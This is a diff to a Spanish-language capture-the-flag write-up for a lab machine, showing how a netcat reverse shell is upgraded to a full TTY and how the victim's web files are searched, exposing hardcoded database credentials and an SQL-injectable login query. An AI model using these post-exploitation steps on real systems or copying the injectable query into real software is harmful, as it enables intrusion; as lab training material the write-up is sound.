@@ -167,10 +167,51 @@ Enunciado :
         www-data@ubuntu:/var/www/html/secret$ whoami
         whoami
         www-data
-
-
     
+  - upgradeamos a full tty
 
+        www-data@ubuntu:/var/www/html/secret$ SHELL=/bin/bash script -q /dev/null
+        SHELL=/bin/bash script -q /dev/null
+        www-data@ubuntu:/var/www/html/secret$ export TERM=xterm
+        export TERM=xterm
+        www-data@ubuntu:/var/www/html/secret$ ^Z
+        zsh: suspended  nc -lnvp 1988
+                                                                                                                                                                      
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/chill_hack]
+        └─# stty raw -echo ;fg 
+        [1]  + continued  nc -lnvp 1988
+                                       reset
+        
+        www-data@ubuntu:/var/www/html/secret$ stty rows 52 columns 159
+        www-data@ubuntu:/var/www/html/secret$ 
+
+## Elevamos privilegios en la maquina victima y obtenemos flags.
+
+- Vamos retrocediento directorios en busca de informacion.
+
+  - Directorio /files encontramos cosas muy interesantes.
+
+    1) index.php --> Credenciales de acceso a una base de datos Mysql
+   
+           $con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
+
+    2) account.php -->  Vemos que la password la almacena como un hash(md5) y como hace la query para validar el login.
+
+            $pw = hash("md5",$pw);
+            $query = $this->con->prepare("SELECT * FROM users WHERE username='$un' AND password='$pw'");
+
+    3) hacker.php --> Encontramos estos dos mensajes que no sabemos muy bien a que se refieren.
+
+            style="background-color:red;">You have reached this far. </h2>
+            style="background-color:black;">Look in the dark! You will find your answer</h1>
+
+    4) Directorio images --> Encontramos dos imagenes las cuales una de ellas su nombre es un hash(md5) un poco raro
+
+           -rw-r--r-- 1 root root 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif
+           -rw-r--r-- 1 root root   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg
+
+
+  - Directorio /home/apaar
     
 
 
